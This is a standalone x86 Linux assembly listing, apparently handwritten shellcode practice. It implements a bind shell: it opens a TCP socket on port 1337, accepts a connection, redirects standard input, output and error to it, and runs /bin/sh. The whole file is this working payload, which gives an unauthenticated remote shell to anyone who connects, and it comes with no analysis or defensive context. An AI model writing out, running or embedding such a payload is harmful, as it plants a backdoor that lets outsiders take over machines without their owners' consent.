global _start

section .text

_start:


	xor eax, eax
	xor ebx, ebx

	inc ebx

	push eax
	push BYTE 0x1
	push BYTE 0x2

	mov ecx, esp

	push BYTE 102
	pop eax

	int 0x80

	mov edi, eax

	mov BYTE al, 0x66

	inc ebx

	xor edx, edx
	push edx
	push WORD 0x3905
	push WORD bx

	mov ecx, esp

	push BYTE 16
	push ecx
	push edi

	mov ecx, esp

	int 0x80

	mov BYTE al, 102

	add ebx, ebx ; Could try add ebx, [ebx]

	push ebx
	push edi

	mov ecx, esp

	int 0x80

	push BYTE 0x66
	pop eax

	inc ebx

	push edx
	push edx
	push edi

	mov ecx, esp

	int 0x80

	mov ebx, eax

	xor ecx, ecx
	mov BYTE cl, 0x2

	looper:
	mov BYTE al, 0x3F
	int 0x80
	dec ecx
	jns looper



	xor eax, eax

	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push edx
	mov edx, esp
	push ebx
	mov ecx, esp

	mov BYTE al, 0xb
	int 0x80
